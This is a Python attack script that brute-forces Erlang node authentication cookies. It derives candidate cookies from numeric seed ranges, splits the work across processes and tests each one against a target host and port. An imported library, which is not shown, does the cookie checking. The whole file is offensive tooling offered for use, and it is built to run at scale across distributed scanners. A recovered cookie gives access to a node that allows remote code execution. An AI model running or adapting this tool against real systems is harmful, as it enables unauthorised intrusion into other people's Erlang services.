#!/usr/bin/env python3
import argparse
import multiprocessing
from sys import stderr, exit
from socket import gethostname
from os import cpu_count
from os.path import isfile
from time import time, sleep
from multiprocessing import Pool
from itertools import product
from ERLPopper import *

#   char full_space[] = "0,68719476735,100.0";

def parse_str_or_file(in_str):
    """
    Expecting:
        <string>
        - OR -
        <string_file>
    Where:
        <string> is a single item
        <string_file> is a newline-delimited list of <string>s
    """

    list_lines = []
    if not isfile(in_str):
        list_lines = [in_str]
    else:
        list_lines = [x.strip() for x in open(in_str, "r").readlines()]

    return list_lines

def split(a, n):
    # From: https://stackoverflow.com/questions/2130016/splitting-a-list-into-n-parts-of-approximately-equal-length
    k, m = divmod(len(a), n)
    return (a[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(n))

def go(args):
    # Unpack args
    (target, interval, version, verbose) = args

    # Unpack interval
    (start, end) = (int(i) for i in interval)

    interval_time_last = time()
    r = 0
    old_r = 0
    prog = start

    epop = ERLPopper(target=target, cookie=None, version=version, verbose=verbose)
    for i in range(start, end):
        if found.is_set():
            return None

        # Only update every 2 seconds so we're not always waiting for locks
        #  But the call to time() takes time and you're doing it every... time.
        #  Is it faster to wait for locks or to call time() and do that math?
        if time() - interval_time_last > 2:
            old_r = r
            r = int((i - prog)/2)
            with rate.get_lock():
                rate.value -= old_r
                rate.value += r
            with interval_progress.get_lock():
                interval_progress.value += r
            prog = i
            interval_time_last = time()
            
        cookie = ERLPopper.create_cookie_from_seed(i)
        if epop.check_cookie(cookie):
            return cookie
    
    with rate.get_lock():
        rate.value -= old_r
    
    return None

if __name__ == "__main__":
    # Parse args
    parser = argparse.ArgumentParser(
            description="Attempt to brute force EPMD node cookie given CSV file consisting of <host:port>,<start>,<end>. This was primarily written for ease of use by axiom-scan."
    )

    parser.add_argument("target_and_interval", action="store", type=parse_str_or_file, help="Target node and interval <host:port>,<start>,<end> or file containing newline-delimited list of <host:port>,<start>,<end> strings.")
    version_group = parser.add_mutually_exclusive_group()
    version_group.add_argument("--old", action="store_true", help="Use old handshake method (default).")
    version_group.add_argument("--new", action="store_true", help="Use new handshake method.")
    parser.add_argument("--verbose", action="store_true", help="Extra output for debugging (n processes all spitting out verbose output... be smart).")
    parser.add_argument("--show_rate", action="store_true", default=True, help="Tell worker process whether it should print its cookies/sec rate.")
    parser.add_argument("--processes", action="store", type=int, help="Number of processes to use (default: return value of os.cpu_count()).")

    args = parser.parse_args()

    version = 5
    if args.new:
        version = 6

    # Make rate variable available to all processes
    rate = multiprocessing.Value('I')
    interval_progress = multiprocessing.Value('I')
    
    num_processes = args.processes
    if not num_processes:
        num_processes = cpu_count()

    if num_processes < 3:
        print("[E] Number of processes should be 3 or greater (try --processes 64).")
        exit(-1)

    # Work through one target/interval at a time
    #  Not using _async calls, otherwise you'll have num_processes * len(target_and_interval) processes
    for ti in args.target_and_interval:
        hostname = gethostname()
        (target, _) = ti.split(',', 1)
        (start, end) = (int(i) for i in _.split(','))
        num_seeds = end - start

        print(f"Dividing {num_seeds} seeds ({start},{end}) among {num_processes} processes...")
        intervals = [(x.start, x.stop) for x in split(range(start, end), num_processes)]

        rate = multiprocessing.Value('I')
        interval_progress = multiprocessing.Value('I')
        found = multiprocessing.Event()

        with Pool(processes=num_processes) as pool:
            targets_intervals_product = product([target], intervals, [version], [args.verbose])

            imap_it = pool.imap(func=go, iterable=targets_intervals_product)

            last_update_time = time()
            while 1:
                if time() - last_update_time > 2:
                    print(f"[*] Host: {hostname}\tRate: {rate.value}/s\tProgress: {interval_progress.value}/{(end-start)} ({interval_progress.value/(end-start):.2f}%)", file=stderr)
                    last_update_time = time()
                try:
                    # Try to get result or timeout after 0.02s
                    r = imap_it.next(0.02)
                    if r:
                        print(f"[+] Host '{hostname}' found cookie '{r}' for target '{target}'!")
                        break
                except StopIteration:
                    break
                except multiprocessing.TimeoutError:
                    continue
        
            found.set()